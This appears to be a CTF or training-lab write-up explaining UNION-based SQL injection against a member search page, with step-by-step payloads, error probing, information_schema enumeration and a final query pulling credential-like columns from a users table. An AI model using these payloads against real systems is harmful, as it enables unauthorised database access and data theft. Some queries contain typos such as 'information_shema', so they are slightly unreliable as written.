# SQL Injection

## Definition

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.


## How it work

A vulnerable  application or an user takes user input and concatenates it directly into an SQL query without validation or parameterization.


### Normal  Example



```
sql
SELECT first_name, surname FROM users WHERE id = 1 
```
The application displays the user's first name and surname.

### Attack Example

An attacker injects SQL code into the id parameter:

SELECT first_name , surname FROM uesrs WHERE id = 1 UNION SELECT 1,2

The database executes the injected query alongside the original one ,revealing hidden data.

## Stage of operation

### 1. Indentyfy the Vulnerable Parameter

Navigate to the member page: 

```
http://10.11.200.205/?page=member
```
Enter any numeric value (e.g. `1`) in the search form and observe the results:
```
ID: 1
First name: one
Surname: me
```

 Enter a single quote (`'`) as the input value.
 The application returns a raw SQL error, confirming that the input is being concatenated directly into the SQL query without proper sanitization:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```

The `id` parameter in the submitted request is vulnerable to **SQL injection**.


### 2. Determine the Column Count

User **ORDER BY N -** increment N until the query fails:

```
1 ORDER BY 1 --
1 ORDER BY 2 --
1 ORDER BY 3 --   → error: Unknown column '3' in 'order clause'
```

The application has **2 columns**.

### 3. Locate Visible Output Columns

Use UNION attack to append a SELECT statement to the original query

Payload used: `1 UNION SELECT 1,2--`

Both injected values are reflected on the page:

ID: 1 UNION SELECT 1,2
First name: 1
Surname: 2

Both columns are reflected in the response and can therefore be used to extract arbitrary data from the database.


### 4.Retrieve table names from information_shema

**INFORMATION_SCHEMA** in MySQL is a metadata database that contains information about the structure of all databases, including tables, columns, indexes, views, constraints, and other database objects.

```
1 UNION SELECT table_name,table_shema FROM information_shema.tables --
```

With this command, we can access the table name and the table_schema, which represents the name of the database that contains the table.

There are: 

```
ID: 1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
First name: db_default
Surname : Member_Brute_Force

ID: 1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
First name: users
Surname : Member_Sql_Injection

ID: 1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
First name: guestbook
Surname : Member_guestbook

ID: 1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
First name: list_images
Surname : Member_images

ID: 1 UNION SELECT table_name, table_schema FROM information_schema.tables -- 
First name: vote_dbs
Surname : Member_surve
```

With this result we can see modelise the database like

Database:
Member_Brute_Force:
    table:
        -db_default
Database:
Member_Sql_Injection:
    table:
        -users
Database:
Member_guestbookn:
    table:
        -guestbook
Database:
Member_images:
    table:
        -list_images
Database:
Member_survey:
    table:
        -vote_dbs

Now we got the Database name and we need to know the column name and the table name of all tables



We can access to the column_name  and table_name of all table 
```
1 UNION SELECT column_name, table_name FROM information_schema.columns
```

we can see somthing like this

```
Table: db_default
    columns:
        - id
        - username
        - password

Table: users
    columns:
        - user_id
        - first_name
        - last_name
        - town
        - country
        - planet
        - Commentaire
        - countersign

Table: guestbook
    columns:
        - id_comment
        - comment
        - name

Table: list_images
    columns:
        - id
        - url
        - title
        - comment

Table: vote_dbs
    columns:
        - id_vote
        - vote
        - nb_vote
        - subject
```

Now we got all information to acces the content of the column in the table  with this commande 
```
1 UNION SELECT [column1], [colomn2]  FROM [database].[tables];
```

and on the column commentaire and countersign in the tables users in the database Member_Sql_Injection


1 UNION SELECT commentaire, countersign  FROM Member_Sql_Injection.users;

